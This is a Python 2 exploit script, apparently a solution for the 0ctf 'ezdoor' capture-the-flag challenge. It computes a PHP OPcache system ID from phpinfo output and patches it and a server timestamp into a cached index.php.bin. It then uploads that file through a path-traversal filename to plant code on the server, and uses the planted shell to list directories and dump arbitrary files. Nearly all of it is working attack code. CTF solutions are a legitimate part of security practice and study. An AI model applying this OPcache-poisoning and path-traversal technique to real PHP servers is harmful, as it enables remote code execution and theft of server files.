#!/usr/bin/env python
import requests
import struct
import re
import argparse
from hashlib import md5

payload = {'action':'upload', 'name':''}

url = 'http://{0}:{1}/index.php'
name = '../../../../../../../../tmp/cache/{0}/var/www/html/{1}index.php.bin'

def reset_time():
    payload['action'] = 'reset'
    r = requests.post(url, params=payload)
    payload['action'] = 'time'
    r = requests.post(url, params=payload)
    print 'timestamp = %s ' % r.content
    #print hex(int(r.content))[2:]
    return struct.pack('<I',int(r.content))


def get_pwd():
    payload['action'] = 'pwd'
    r = requests.post(url, params=payload)
    return str(r.content)


def read_file():
    path = raw_input('enter path on server: ')
    payload['action'] = 'shell'
    payload['file'] = path
    r = requests.post(url, params=payload)
    with open('flag.bin', 'wb') as f:
        f.write(r.content)
        f.close()
    print 'dumping file with size %d on disk...' % len(r.content)


def list_dir():
    path = raw_input('enter path on server: ')
    payload['action'] = 'shell'
    payload['dir'] = path
    r = requests.post(url, params=payload)
    print r.content.strip()


def compute_sysid(fname):
    with open(fname) as file:
        content = file.read()
        file.close()

    php_version = re.search(r'PHP Version => (.*)', content)
    if not php_version:
        php_version = re.search(r'<h1 class="p">PHP Version (.*)</h1>', content)
    php_version = php_version.group(1)

    zend_ext_id = re.search(r'Zend Extension Build => (.*)', content)
    if not zend_ext_id:
        zend_ext_id = re.search(r'<td class="e">Zend Extension Build </td><td class="v">(.*) </td></tr>', content)
    zend_ext_id = zend_ext_id.group(1)

    arch = re.search(r'System => (.*)', content)
    if not arch:
        arch = re.search(r'<tr><td class="e">System </td><td class="v">(.*) </td></tr>', content)
    arch = arch.group(1).split()[-1]

    bin_id = '48888' if arch == 'x86_64' else '44444'
    zend_bin_id = 'BIN_SIZEOF_CHAR' + bin_id
    #print 'php version = %s, zend_ext_id = %s, zend_bin_id = %s' % (php_version, zend_ext_id, zend_bin_id)
    sys_id = md5(php_version + zend_ext_id + zend_bin_id).hexdigest()
    return sys_id


def exploit(fname):


    '''
    ctime = shell()
    #Sun, 01 Apr 2018 07:10:40 GMT
    print ctime
    ts = time.mktime(time.strptime(ctime, '%a, %d %b %Y %H:%M:%S %Z'))
    print ts
    ts_hex = hex(struct.unpack("<I", struct.pack('<f', ts))[0])
    print ts_hex
    '''

    system_id = compute_sysid(fname)
    pwd = get_pwd()
    time = reset_time()
    files = {'file': open('index.php.bin', 'r+b')}

    ''' update system_id '''
    files['file'].seek(0x8)
    files['file'].write(system_id)
    files['file'].seek(0, 0)
    print 'system_id = %s' % system_id

    ''' update timestamp '''
    files['file'].seek(0x40, 0)
    files['file'].write(time)
    files['file'].seek(0, 0)

    path = name.format(system_id, pwd)
    print 'pathname = %s' % path
    payload['action'] = 'upload'
    payload['name'] = path
    r = requests.post(url, params=payload, files=files)
    print r.status_code

    list_dir()
    read_file()


if __name__=='__main__':
    parser = argparse.ArgumentParser(description='0ctf - ezdoor writeup')
    parser.add_argument('-f', '--file', default='phpinfo.ini', dest = 'fname')
    parser.add_argument('--host', default='localhost')
    parser.add_argument('-p', '--port', default='80')
    args = parser.parse_args()
    url = url.format(args.host, args.port)
    exploit(args.fname)
